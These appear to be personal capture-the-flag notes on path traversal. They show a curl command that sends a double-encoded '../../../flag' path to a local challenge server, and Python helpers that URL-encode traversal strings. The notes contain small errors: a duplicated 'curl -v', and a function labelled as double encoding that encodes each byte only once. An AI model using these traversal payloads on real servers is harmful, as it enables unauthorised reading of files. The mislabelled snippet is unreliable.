; ===============  Web Security

; ===    GET URL injection
; Here I tricked the server to read /flag (file on the actual OS) through the server
; in reality, I will trick the server to let it do/read other stuff
; stuff more sensitive, the developer didn't through/handle my tricky input.
;
; When its GET request I like to use google!
; to convet string for GET URL; ex: "../../../flag"
; https://www.google.com/search?q=..%2F..%2F..%2Fflag
$ curl -v curl -v http://challenge.localhost:80/..%252F..%252F..%252Fflag

; WITH Python:
;
; url-encode string for a GET path; like Google URLs
from urllib.parse import quote
quote("../../../flag", safe="")                  # ..%2F..%2F..%2Fflag

; double encodes
def urlenc(s: str) -> str:
      return "%" + s.encode().hex("%")

print(urlenc("../../../flag"))     # %2e%2e%2f%2e%2e%2f%2e%2e%2f%66%6c%61%67

